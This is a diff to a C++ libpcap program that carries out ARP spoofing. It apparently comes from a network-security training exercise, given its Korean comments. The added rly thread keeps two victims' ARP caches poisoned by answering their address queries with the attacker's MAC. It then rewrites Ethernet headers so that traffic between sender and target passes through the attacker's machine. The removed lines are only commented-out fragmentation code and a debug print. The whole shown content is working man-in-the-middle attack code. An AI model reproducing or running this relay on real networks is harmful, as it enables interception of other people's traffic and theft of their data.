@@ -152,50 +152,6 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sende
                 int flag = 0;
                 sendsize = header->len;
                 memcpy(data, packet + 34, sendsize - 34);
-
-                // //단위 400 434 int i = 0;
-                // while (sendsize > 434)
-                // {
-                //     flag = 1;
-                //     for (int j = 0; j < 434 - 34; j++)
-                //     {
-                //         *((u_char *)pkt + 34 + j) = *(packet + 34 + 400 * i + j);
-                //     }
-                //     ip_pkt->ip_.ip_len = htons(420);
-                //     ip_pkt->ip_.ip_offset = htons((50 * i) | 0b0010000000000000);
-
-                //     int res = pcap_sendpacket(pcap, (u_char *)pkt, 434);
-                //     if (res != 0)
-                //     {
-                //         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-                //         return -1;
-                //     }
-                //     sendsize -= 400;
-                //     i++;
-                // }
-
-                // if (flag == 1)
-                // {
-                //     for (int j = 0; j < sendsize - 34; j++)
-                //     {
-                //         *((u_char *)pkt + 34 + j) = *(packet + 34 + 400 * i + j);
-                //     }
-                //     // memcpy(pkt + 34, data + (400 * i), 400);
-                //     sendsize = header->len - 400 * i;
-                //     ip_pkt->ip_.ip_len = htons(sendsize - 14);
-                //     ip_pkt->ip_.ip_offset = htons((50 * i) | 0b0000000000000000);
-
-                //     memcpy(pkt + 34, data + 400 * i, sendsize);
-                //     int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
-                //     // int res = pcap_sendpacket(pcap, (u_char *)pkt, sendsize);
-                //     if (res != 0)
-                //     {
-                //         fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
-                //         return -1;
-                //     }
-                //     continue;
-                // }
-
                 //단위 400 434 int i = 0;
                 // while (sendsize > 1400 + 34)
                 // {
@@ -240,8 +196,6 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, u_int8_t *sende
                 //     }
                 //     continue;
                 // }
-
-                printf("sendsize : %d\n", sendsize);
                 int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
                 if (res != 0)
                 {
@@ -298,6 +252,88 @@ void *arp_relay(void *arp_info)
             printf("where is target?\n");
             request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
             continue;
+        }
+    }
+}
+
+void *rly(void *arp_info)
+{
+    ArpInfo *f_arp_info = (ArpInfo *)arp_info;
+    pcap_t *pcap = f_arp_info->pcap;
+    u_int8_t *target_mac = f_arp_info->target_mac;
+    u_int8_t *sender_mac = f_arp_info->sender_mac;
+    u_int8_t *attacker_mac = f_arp_info->attacker_mac;
+    u_int8_t *target_ip = f_arp_info->target_ip;
+    u_int8_t *sender_ip = f_arp_info->sender_ip;
+    const char *dev = f_arp_info->dev;
+    struct pcap_pkthdr *header;
+    const u_char *packet;
+    EthArpPacket *pkt;
+    TcpIpPacket *ip_pkt;
+    while (true)
+    {
+        int res = pcap_next_ex(pcap, &header, &packet);
+        pkt = (EthArpPacket *)packet;
+        ip_pkt = (TcpIpPacket *)packet;
+        int size_of_data;
+        int offset = 0;
+
+        u_int sendsize;
+        u_char data[1500];
+        if (res == 0)
+            continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            break;
+        }
+
+        if ((((EthArpPacket *)packet)->eth_.type_ == htons(EthHdr::Arp)) && (((EthArpPacket *)packet)->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(((EthArpPacket *)packet)->arp_.smac_, target_mac)) && (if_same_ip(((EthArpPacket *)packet)->arp_.tip, sender_ip)))
+        {
+            printf("where is sender?\n");
+            request(dev, pcap, target_mac, attacker_mac, attacker_mac, sender_ip, target_mac, target_ip, 1);
+            continue;
+        }
+
+        if ((((EthArpPacket *)packet)->eth_.type_ == htons(EthHdr::Arp)) && (((EthArpPacket *)packet)->arp_.pro_ == htons(EthHdr::Ip4)) && (if_same_mac(((EthArpPacket *)packet)->arp_.smac_, sender_mac)) && (if_same_ip(((EthArpPacket *)packet)->arp_.tip, target_ip)))
+        {
+            printf("where is target?\n");
+            request(dev, pcap, sender_mac, attacker_mac, attacker_mac, target_ip, sender_mac, sender_ip, 1);
+            continue;
+        }
+
+        if (if_same_mac(pkt->eth_.smac_, sender_mac))
+        {
+            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
+            {
+                copy_mac(target_mac, pkt->eth_.dmac_);
+                copy_mac(attacker_mac, pkt->eth_.smac_);
+
+                int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
+                if (res != 0)
+                {
+                    printf("pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+                    break;
+                }
+            }
+        }
+        else if (if_same_mac(pkt->eth_.smac_, target_mac))
+        {
+            if (if_same_mac(pkt->eth_.dmac_, attacker_mac))
+            {
+                copy_mac(sender_mac, pkt->eth_.dmac_);
+                copy_mac(attacker_mac, pkt->eth_.smac_);
+
+                int i = 0;
+                int flag = 0;
+                sendsize = header->len;
+                int res = pcap_sendpacket(pcap, (u_char *)pkt, header->len);
+                if (res != 0)
+                {
+                    fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+                    break;
+                }
+            }
         }
     }
 }
